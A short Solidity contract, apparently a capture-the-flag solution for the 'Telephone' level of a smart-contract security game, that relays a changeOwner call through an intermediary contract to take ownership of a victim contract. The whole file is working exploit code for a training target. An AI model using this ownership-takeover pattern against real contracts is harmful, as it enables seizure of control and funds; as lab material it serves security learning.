pragma solidity ^0.8.0;
import "./04-telephone.sol";

contract AttackTelePhone {
    Telephone public victimContract;

  constructor(address _victimContractAddress) {
    victimContract = Telephone(_victimContractAddress);
  }

  function changeOwner(address ownerAddress) public {
    victimContract.changeOwner(ownerAddress);
  }
}